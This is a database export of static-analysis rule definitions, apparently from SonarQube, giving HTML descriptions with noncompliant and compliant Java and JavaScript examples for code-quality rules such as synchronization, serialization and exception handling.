740	Tabulation characters should not be used	S00105	S00105	squid	<p>\nDevelopers should not need to configure the tab width of their text editors in order to be able to read source code.\nSo the use of tabulation character must be banned.\n</p>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453807275	1511453807275	1
711	"private" methods that don't access instance data should be "static"	S2325	S2325	squid	<p>\n  <code>private</code> methods that don't access instance data can be <code>static</code>\n  to prevent any misunderstanding about the contract of the method.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Utilities {\n  private static String magicWord = "magic";\n\n  private String getMagicWord() { // Noncompliant\n    return magicWord;\n  }\n\n  private void setMagicWord(String value) { // Noncompliant\n    magicWord = value;\n  }\n\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass Utilities {\n  private static String magicWord = "magic";\n\n  private static String getMagicWord() {\n    return magicWord;\n  }\n\n  private static void setMagicWord(String value) {\n    magicWord = value;\n  }\n\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n  When <code>java.io.Serializable</code> is implemented the following three methods are excluded by the rule:\n</p>\n<ul>\n  <li><code>private void writeObject(java.io.ObjectOutputStream out) throws IOException;</code></li>\n  <li><code>private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;</code></li>\n  <li><code>private void readObjectNoData() throws ObjectStreamException;</code></li>\n</ul>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807242	1511453807243	1
712	Blocks synchronized on fields should not contain assignments of new objects to those fields	S2445	S2445	squid	<p>Synchronizing on a class field synchronizes not on the field itself, but on the object assigned to it. So reassigning a field in a block synchronized on that field's contents immediately opens the block up to access by another thread.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nprivate String color = "red";\n\nprivate void doSomething(){\n  synchronized(color) {  // lock is actually on object instance "red" referred to by the color variable\n    //...\n    color = "green"; // Noncompliant; other threads now allowed into this block\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nprivate String color = "red";\nprivate Object lockObj = new Object();\n\nprivate void doSomething(){\n  synchronized(lockObj) {\n    //...\n    color = "green";\n    // ...\n  }\n}\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	multi-threading	f	HTML	1511453807243	1511453807244	2
713	Generic exceptions should never be thrown	S00112	S00112	squid	<p>Using such generic exceptions as <code>Error</code>, <code>RuntimeException</code>, <code>Throwable</code>, and <code>Exception</code> prevents calling methods from handling true, system-generated exceptions differently than application-generated errors. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void foo(String bar) throws Throwable {  // Noncompliant\n  throw new RuntimeException("My Message");     // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic void foo(String bar) {\n  throw new MyOwnRuntimeException("My Message"); \n}\n</pre>\n<h2>Exceptions</h2>\n\n<p>Generic exceptions in the signatures of overriding methods are ignored.</p>\n<pre>\n@Override\npublic void myMethod() throws Exception {...}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/397.html">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cwe,error-handling	f	HTML	1511453807244	1511453807245	3
715	Synchronized classes Vector, Hashtable, Stack and StringBuffer should not be used	S1149	S1149	squid	<p>\nEarly classes of the Java API, such as <code>Vector</code>, <code>Hashtable</code> and <code>StringBuffer</code>, were synchronized to make them thread-safe.\nUnfortunately, synchronization has a big negative impact on performance, even when using these collections from a single thread.\n</p>\n\n<p>It is better to use their new unsynchronized replacements:</p>\n\n<ul>\n  <li><code>ArrayList</code> or <code>LinkedList</code> instead of <code>Vector</code></li>\n  <li><code>Deque</code> instead of <code>Stack</code></li>\n  <li><code>HashMap</code> instead of <code>Hashtable</code></li>\n  <li><code>StringBuilder</code> instead of <code>StringBuffer</code></li>\n</ul>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nVector cats = new Vector();\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nArrayList cats = new ArrayList(); \n</pre>\n\n<h2>Exceptions</h2>\n\n<p>Use of those synchronized classes is allowed in method signatures when overriding an existing method.</p>\n\n<pre>\n@Override\npublic Vector getCats() {...} \n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	multi-threading,performance	f	HTML	1511453807246	1511453807247	1
716	Non-serializable classes should not be written	S2118	S2118	squid	Nothing in a non-serializable class will be written out to file, and attempting to serialize such a class will result in an exception being thrown. Only a class that <code>implements Serializable</code> or one that extends such a class can successfully be serialized (or de-serialized).\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Vegetable {  // neither implements Serializable nor extends a class that does\n  //...\n}\n\npublic class Menu {\n  public void meal() throws IOException {\n    Vegetable veg;\n    //...\n    FileOutputStream fout = new FileOutputStream(veg.getName());\n    ObjectOutputStream oos = new ObjectOutputStream(fout);\n    oos.writeObject(veg);  // Noncompliant. Nothing will be written\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Vegetable implements Serializable {  // can now be serialized\n  //...\n}\n\npublic class Menu {\n  public void meal() throws IOException {\n    Vegetable veg;\n    //...\n    FileOutputStream fout = new FileOutputStream(veg.getName());\n    ObjectOutputStream oos = new ObjectOutputStream(fout);\n    oos.writeObject(veg);\n  }\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	serialization	f	HTML	1511453807248	1511453807248	2
717	Variables should not be declared before they are relevant	S1941	S1941	squid	<p>\n  For the sake of clarity, variables should be declared as close to where they're used as possible.\n  This is particularly true when considering methods that contain early returns and the potential to throw exceptions.\n  In these cases, it is not only pointless, but also confusing to declare a variable that may never be used because conditions for an early return are met first.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic boolean isConditionMet(int a, int b) {\n  int difference = a - b;\n  MyClass foo = new MyClass(a);  // Noncompliant; not used before early return\n\n  if (difference &lt; 0) {\n    return false;\n  }\n\n  // ...\n\n  if (foo.doTheThing()) {\n    return true;\n  }\n  return false;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic boolean isConditionMet(int a, int b) {\n  int difference = a - b;\n\n  if (difference &lt; 0) {\n    return false;\n  }\n\n  // ...\n\n  MyClass foo = new MyClass(a);\n  if (foo.doTheThing()) {\n    return true;\n  }\n  return false;\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	brain-overload	f	HTML	1511453807249	1511453807249	1
760	Deprecated code should be removed eventually	S1133	S1133	squid	<p>\nThis rule is meant to be used as a way to track code which is marked as being deprecated.\nDeprecated code should eventually be removed.\n</p>\n\n<p>\nThe following code illustrates this rule:\n</p>\n\n<pre>\nclass Foo {\n  /**\n    * @deprecated\n    */\n  public void foo() {    // Noncompliant\n  }\n\n  @Deprecated            // Noncompliant\n  public void bar() {\n  }\n\n  public void baz() {    // Compliant\n  }\n}\n</pre>	0	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	obsolete	f	HTML	1511453807299	1511453807299	1
718	A field should not duplicate the name of its containing class	S1700	S1700	squid	<p>It's confusing to have a class member with the same name (case differences aside) as its enclosing class. This is particularly so when you consider the common practice of naming a class instance for the class itself.</p>\n<p>Best practice dictates that any field or member with the same name as the enclosing class be renamed to be more descriptive of the particular aspect of the class it represents or holds.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo { \n  private String foo; \n\n  public String getFoo() { } \n} \n\nFoo foo = new Foo(); \nfoo.getFoo() // what does this return? \n</pre> \n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo {\n  private String name; \n\n  public String getName() { }\n}\n\n//...\n\nFoo foo = new Foo();\nfoo.getName()\n\n</pre>\n<h2>Exceptions</h2>\n\n<p>When the type of the field is the containing class and that field is static, no issue is raised to allow singletons named like the type. </p>\n<pre>\npublic class Foo {\n  ...\n  private static Foo foo;\n  public Foo getInstance() {\n    if(foo==null) {\n      foo = new Foo();\n    }\n    return foo;\n  }\n  ...\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	brain-overload	f	HTML	1511453807250	1511453807250	1
719	Fields and methods should not have conflicting names	S1701	S1701	squid	<p>It's confusing to have a class field with the same name as a method in the class. It's also confusing to have multiple fields that differ only in capitalization</p>\n<p>Typically this situation indicates poor naming. Method names should be action-oriented, and thus contain a verb, which is unlikely in the case where both a method and a member have the same name. However, renaming a public method could be disruptive to callers. Therefore renaming the member is the recommended action.</p>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Foo {\n\n  public static final String NAME_QUERY = "Select name from person";\n  private String queryString; // member has been renamed\n  public String query() { \n    // do something...\n  }\n\n  private void doSomething() {\n\n    String tmp = query; // results in a compile error\n    String tmp2 = query(); // no question now what was intended\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	brain-overload	f	HTML	1511453807251	1511453807251	1
720	Classes and methods that rely on the default system encoding should not be used	S1943	S1943	squid	<p>Using classes and methods that rely on the default system encoding can result in code that works fine in its "home" environment. But that code may break for customers who use different encodings in ways that are extremely difficult to diagnose and nearly, if not completely, impossible to reproduce when it's time to fix them.</p>\n<p>This rule detects uses of the following classes and methods:</p>\n<ul>\n<li> <code>FileReader</code></li>\n<li> <code>FileWriter</code></li>\n<li> String constructors with a <code>byte[]</code> argument but no <code>Charset</code> argument</li>\n<ul>\n<li> <code>String(byte[] bytes)</code></li>\n<li> <code>String(byte[] bytes, int offset, int length)</code> </li>\n</ul>\n<li> <code>String.getBytes()</code></li>\n<li> <code>String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin)</code></li>\n<li> <code>InputStreamReader(InputStream in)</code></li>\n<li> <code>OutputStreamWriter(OutputStream out)</code></li>\n<li> <code>ByteArrayOutputStream.toString()</code></li>\n<li> Some <code>Formatter</code> constructors</li>\n<ul>\n<li> <code>Formatter(String fileName)</code></li>\n<li> <code>Formatter(File file)</code></li>\n<li> <code>Formatter(OutputStream os)</code></li>\n</ul>\n<li> Some <code>Scanner</code> constructors</li>\n<ul>\n<li> <code>Scanner(File source)</code></li>\n<li> <code>Scanner(Path source)</code></li>\n<li> <code>Scanner(InputStream source)</code></li>\n</ul>\n<li> Some <code>PrintStream</code> constructors</li>\n<ul>\n<li> <code>PrintStream(File file)</code></li>\n<li> <code>PrintStream(OutputStream out)</code></li>\n<li> <code>PrintStream(OutputStream out, boolean autoFlush)</code></li>\n<li> <code>PrintStream(String fileName)</code></li>\n</ul>\n<li> Some <code>PrintWriter</code> constructors</li>\n<ul>\n<li> <code>PrintWriter(File file)</code></li>\n<li> <code>PrintWriter(OutputStream out)</code></li>\n<li> <code>PrintWriter(OutputStream out, boolean autoFlush)</code></li>\n<li> <code>PrintWriter(String fileName)</code></li>\n</ul>\n<li> <code>IOUtils</code> methods which accept an encoding argument when that argument is null, and overloads of those methods that omit the encoding argument</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	unpredictable	f	HTML	1511453807251	1511453807252	1
721	"indexOf" checks should use a start position	S2912	S2912	squid	<p>\n  One thing that makes good code good is the clarity with which it conveys the intent of the original programmer to maintainers,\n  and the proper choice of <code>indexOf</code> methods can help move code from confusing to clear.\n</p>\n\n<p>\n  If you need to see whether a substring is located beyond a certain point in a string,\n  you can test the <code>indexOf</code> the substring versus the target point, or you can use the version of <code>indexOf</code>\n  which takes a starting point argument. The latter is arguably clearer because the result is tested against -1,\n  which is an easily recognizable "not found" indicator.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nString name = "ismael";\n\nif (name.indexOf("ae") > 2) { // Noncompliant\n// ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nString name = "ismael";\n\nif (name.indexOf("ae", 2) > -1) {\n// ...\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	confusing	f	HTML	1511453807252	1511453807252	1
722	Fields in a "Serializable" class should either be transient or serializable	S1948	S1948	squid	<p>Fields in a <code>Serializable</code> class must themselves be either <code>Serializable</code> or <code>transient</code> even if the class is never explicitly serialized or deserialized. That's because under load, most J2EE application frameworks flush objects to disk, and an allegedly <code>Serializable</code> object with non-transient, non-serializable data members could cause program crashes, and open the door to attackers.</p>\n<p>This rule raises an issue on non-<code>Serializable</code> fields, and on collection fields when they are not <code>private</code> (because they could be assigned non-<code>Serializable</code> values externally), and when they are assigned non-<code>Serializable</code> types within the class.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Address {\n  //...\n}\n\npublic class Person implements Serializable {\n  private static final long serialVersionUID = 1905122041950251207L;\n\n  private String name;\n  private Address address;  // Noncompliant; Address isn't serializable\n}\n</pre>\n\n<h2>Compliant Example</h2>\n<pre>\npublic class Address implements Serializable {\n  private static final long serialVersionUID = 2405172041950251807L;\n}\n\npublic class Person implements Serializable {\n  private static final long serialVersionUID = 1905122041950251207L;\n\n  private String name;\n  private Address address;\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>The alternative to making all members <code>serializable</code> or <code>transient</code> is to implement special methods which take on the responsibility of properly serializing and de-serializing the object. This rule ignores classes which implement the following methods:</p>\n\n<pre>\nprivate void writeObject(java.io.ObjectOutputStream out) throws IOException\nprivate void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;\n</pre>\n\n<h2>See</h2>\n    <ul>\n      <li><a href="http://cwe.mitre.org/data/definitions/594.html">MITRE, CWE-594</a> - Saving Unserializable Objects to Disk</li>\n      <li><a href="http://docs.oracle.com/javase/6/docs/api/java/io/Serializable.html">Oracle Java 6, Serializable</a></li>\n      <li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html">Oracle Java 7, Serializable</a></li>\n    </ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cwe,serialization	f	HTML	1511453807253	1511453807254	2
723	Methods should not have too many parameters	S00107	S00107	squid	<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many things.</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>With a maximum number of 4 parameters:</p>\n<pre>\npublic void doSomething(int param1, int param2, int param3, String param4, long param5) {\n...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(int param1, int param2, int param3, String param4) {\n...\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>Methods annotated with Spring's <code>@RequestMapping</code> may have a lot of parameters, encapsulation being possible. Such methods are therefore ignored.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	brain-overload	f	HTML	1511453807254	1511453807255	1
724	Try-catch blocks should not be nested	S1141	S1141	squid	<p>Nesting <code>try</code>/<code>catch</code> blocks severely impacts the readability of source code because it makes it too difficult to understand which block will catch which exception.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	confusing	f	HTML	1511453807257	1511453807257	1
725	Increment (++) and decrement (--) operators should not be mixed with other operators in an expression	S881	S881	squid	<p>The use of increment and decrement operators in combination with other arithmetic operators is not recommended, because:</p>\n<p>It can significantly impair the readability of the code.</p>\n<p>It introduces additional side effects into a statement, with the potential for undefined behavior.</p>\n<p>It is safer to use these operators in isolation from any other arithmetic operators.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nu8a = ++u8b + u8c--; \nfoo = bar++ / 4;\n</pre>\n<h2>Compliant Solution</h2>\n\n<p>The following sequence is clearer and therefore safer:</p>\n<pre>\n++u8b;    \nu8a = u8b + u8c; \nu8c--; \nfoo = bar / 4;\nbar++;\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 12.1</li>\n<li> MISRA C:2004, 12.13</li>\n<li> MISRA C:2004, 13.3</li>\n<li> MISRA C++:2008, 5-2-10</li>\n<li> MISRA C:2012, 12.1</li>\n<li> MISRA C:2012, 13.3</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/ZwE">CERT, EXP30-C</a> - \tDo not depend on the order of evaluation for side effects</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/fYAyAQ">CERT, EXP30-CPP</a> - Do not depend on order of evaluation between sequence points</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/yQC7AQ">CERT, EXP05-J</a> - Do not follow a write by a subsequent write or read of the same object within an expression</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,misra	f	HTML	1511453807257	1511453807258	1
726	Invalid "Date" values should not be used	S2110	S2110	squid	<p>Whether the valid value ranges for <code>Date</code> fields start with 0 or 1 varies by field. For instance, month starts at 0, and day of month starts at 1. Enter a date value that goes past the end of the valid range, and the date will roll without error or exception. For instance, enter 12 for month, and you'll get January of the following year.</p>\n\n<p>This rule checks for bad values used in conjunction with <code>java.util.Date</code>, <code>java.sql.Date</code>, and <code>java.util.Calendar</code>. Specifically, values outside of the valid ranges:</p>\n<table>\n  <thead>\n  <tr><td>Field</td> <td>Valid</td></tr>\n  </thead>\n  <tbody>\n    <tr><td>month</td><td>0-11</td></tr>\n    <tr><td>date (day)</td><td>0-31</td></tr>\n    <tr><td>hour</td><td>0-23</td></tr>\n    <tr><td>minute</td><td>0-60</td></tr>\n    <tr><td>second</td><td>0-61</td></tr>\n  </tbody>\n</table>\n\n<p>Note that this rule does not check for invalid leap years, leap seconds (second = 61), or invalid uses of the 31st day of the month.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nDate d = new Date();\nd.setDate(25);\nd.setYear(2014);\nd.setMonth(12);  // Noncompliant; rolls d into the next year\n\nCalendar c = new GregorianCalendar(2014, 12, 25);  // Noncompliant\nif (c.get(Calendar.MONTH) == 12) {  // Noncompliant; invalid comparison\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nDate d = new Date();\nd.setDate(25);\nd.setYear(2014);\nd.setMonth(11);\n\nCalendar c = new Gregorian Calendar(2014, 11, 25);\nif (c.get(Calendar.MONTH) == 11) {\n  // ...\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807259	1511453807259	2
727	Methods should not have too many return statements	S1142	S1142	squid	<p>Having too many return statements in a method increases the method's essential complexity because the flow of execution is broken each time a return statement is encountered. This makes it harder to read and understand the logic of the method.</p>\n<h2>Noncompliant Code Example</h2>\n\n<p>With the default threshold of 3:</p>\n<pre>\npublic boolean myMethod() { // Noncompliant; there are 4 return statements\n  if (condition1) {\n    return true;\n  } else {\n    if (condition2) {\n      return false;\n    } else {\n      return true;\n    }\n  }\n  return false;\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	brain-overload	f	HTML	1511453807259	1511453807259	1
728	Non-public methods should not be "@Transactional"	S2230	S2230	squid	Marking a non-public method <code>@Transactional</code> is both useless and misleading because Spring doesn't "see" non-<code>public</code> methods, and so makes no provision for their proper invocation. Nor does Spring make provision for the methods invoked by the method it called.\n\nTherefore marking a <code>private</code>  method, for instance, <code>@Transactional</code> can only result in a runtime error or exception if the method is actually written to be <code>@Transactional</code>.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Transactional  // Noncompliant\nprivate void doTheThing(ArgClass arg) {\n  // ...\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	spring	f	HTML	1511453807261	1511453807261	2
729	"return" statements should not occur in "finally" blocks	S1143	S1143	squid	<p><code>return</code>ing, <code>break</code>ing, <code>throw</code>ing, and so on from a <code>finally</code> block suppresses the propagation of any unhandled <code>Throwable</code> which was thrown in the <code>try</code> or <code>catch</code> block.</p>\n<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code>, <code>throw</code>, and <code>goto</code>) would force control flow to leave a <code>finally</code> block. </p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic static void main(String[] args) {\n  try {\n    doSomethingWhichThrowsException();\n    System.out.println("OK");   // incorrect "OK" message is printed\n  } catch (RuntimeException e) {\n    System.out.println("ERROR");  // this message is not shown\n  }\n}\n\npublic static void doSomethingWhichThrowsException() {\n  try {\n    throw new RuntimeException();\n  } finally {\n    for (int i = 0; i &lt; 10; i ++) {\n      //...\n      if (q == i) {\n        break; // ignored\n      }\n    }\n\n    /* ... */\n    return;      // Noncompliant - prevents the RuntimeException from being propagated\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic static void main(String[] args) {\n  try {\n    doSomethingWhichThrowsException();\n    System.out.println("OK");\n  } catch (RuntimeException e) {\n    System.out.println("ERROR");  // "ERROR" is printed as expected\n  }\n}\n\npublic static void doSomethingWhichThrowsException() {\n  try {\n    throw new RuntimeException();\n  } finally {\n    for (int i = 0; i &lt; 10; i ++) {\n      //...\n      if (q == i) {\n        break; // ignored\n      }\n    }\n\n    /* ... */\n  }\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/584.html">MITRE, CWE-584</a> - Return Inside Finally Block\n</li><li> <a href="https://www.securecoding.cert.org/confluence/x/mIEbAQ">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block\n</li></ul>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cwe,error-handling	f	HTML	1511453807261	1511453807262	2
730	"URL.hashCode" and "URL.equals" should be avoided	S2112	S2112	squid	<p>The <code>equals</code> and <code>hashCode</code> methods of <code>java.net.URL</code> both make calls out to the Internet and are blocking operations. <code>URI</code> on the other hand makes no such calls and should be used instead unless the specific <code>URL</code> functionality is required.</p>\n\n<p>This rule checks for uses of <code>URL</code>'s in <code>Map</code> and <code>Set</code>, and for explicit calls to the <code>equals</code> and <code>hashCode</code> methods.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void checkUrl(URL url) {\n  Set&lt;URL> sites = new HashSet&lt;URL&gt;();  // Noncompliant\n\n  URL homepage = new URL("http://sonarsource.com");  // Compliant\n  if (homepage.equals(url)) { // Noncompliant\n    // ...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\npublic void checkUrl(URL url) {\n  Set&lt;URI&gt; sites = new HashSet&lt;URI&gt;();  // Compliant\n\n  URI homepage = new URI("http://sonarsource.com");  // Compliant\n  URI uri = url.toURI();\n  if (homepage.equals(uri)) {  // Compliant\n    // ...\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	performance	f	HTML	1511453807262	1511453807263	1
731	A "while" loop should be used instead of a "for" loop	S1264	S1264	squid	<p>\n  When only the condition expression is defined in a <code>for</code> loop, but the init and increment expressions are missing,\n  a <code>while</code> loop should be used instead to increase readability.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (;condition;) { /*...*/ }\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nwhile (condition) { /*...*/ }\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453807263	1511453807263	1
732	Nested blocks of code should not be left empty	S00108	S00108	squid	<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfor (int i = 0; i &lt; 42; i++){}  // Empty on purpose or missing piece of code ?\n</pre>\n<h2>Exceptions</h2>\n\n<p>When a block contains a comment, this block is not considered to be empty unless it is a <code>synchronized</code> block. <code>synchronized</code> blocks are still considered empty even with comments because they can still affect program flow.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	suspicious	f	HTML	1511453807264	1511453807264	1
733	"ResultSet.isLast()" should not be used	S2232	S2232	squid	<p>There are several reasons to avoid <code>ResultSet.isLast()</code>. First, support for this method is optional for <code>TYPE_FORWARD_ONLY</code> result sets. Second, it can be expensive (the driver may need to fetch the next row to answer the question). Finally, the specification is not clear on what should be returned when the <code>ResultSet</code> is empty, so some drivers may return the opposite of what is expected.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nstmt.executeQuery("SELECT name, address FROM PERSON");\nResultSet rs = stmt.getResultSet();\nwhile (! rs.isLast()) { // Noncompliant\n// process row\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nResultSet rs = stmt.executeQuery("SELECT name, address FROM PERSON");\nwhile (! rs.next()) {\n// process row\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	performance,pitfall,sql	f	HTML	1511453807265	1511453807266	1
734	"BigDecimal(double)" should not be used	S2111	S2111	squid	<p>Because of floating point imprecision, you're unlikely to get the value you expect from the <code>BigDecimal(double)</code> constructor. </p>\n<p>From <a href="http://docs.oracle.com/javase/7/docs/api/java/math/BigDecimal.html#BigDecimal(double)">the JavaDocs</a>:</p>\n<blockquote>The results of this constructor can be somewhat unpredictable. One might assume that writing new BigDecimal(0.1) in Java creates a BigDecimal which is exactly equal to 0.1 (an unscaled value of 1, with a scale of 1), but it is actually equal to 0.1000000000000000055511151231257827021181583404541015625. This is because 0.1 cannot be represented exactly as a double (or, for that matter, as a binary fraction of any finite length). Thus, the value that is being passed in to the constructor is not exactly equal to 0.1, appearances notwithstanding.</blockquote>\n<p>Instead, you should use <code>BigDecimal.valueOf</code>, which uses a string under the covers to eliminate floating point rounding errors.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\ndouble d = 1.1;\n\nBigDecimal bd1 = new BigDecimal(d); // Noncompliant; see comment above\nBigDecimal bd2 = new BigDecimal(1.1); // Noncompliant; same result\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\ndouble d = 1.1;\n\nBigDecimal bd1 = BigDecimal.valueOf(d);\nBigDecimal bd2 = BigDecimal.valueOf(1.1);\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/NQAVAg">CERT, NUM10-J</a> - Do not construct BigDecimal objects from floating-point literals</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert	f	HTML	1511453807266	1511453807267	2
735	Lines should not be too long	S00103	S00103	squid	<p>\nHaving to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.\n</p>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807267	1511453807267	1
736	A close curly brace should be located at the beginning of a line	RightCurlyBraceStartLineCheck	RightCurlyBraceStartLineCheck	squid	<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the beginning of a line.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif(condition) {\n  doSomething();} \n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif(condition) {\n  doSomething();\n} \n</pre>\n<h2>Exceptions</h2>\n\n<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered. </p>\n<pre>\nif(condition) {doSomething();} \n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807272	1511453807272	1
777	Function calls should not pass extra arguments	S930	\N	javascript	<p>You can easily call a JavaScript function with more arguments than the function needs, but the extra arguments will be just ignored by function execution.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction say(a, b) {\n  print(a + " " + b);\n}\n\nsay("hello", "world", "!"); // Noncompliant; last argument is not used\n</pre>\n\n<h2>Exceptions</h2>\n<p>No issue is reported when <code>arguments</code> is used in the body of the function being called.</p>\n\n<pre>\nfunction doSomething(a, b) {\n  compute(arguments);\n}\n\ndoSomething(1, 2, 3) // Compliant\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cwe,misra	f	HTML	1511453807344	1511453807345	2
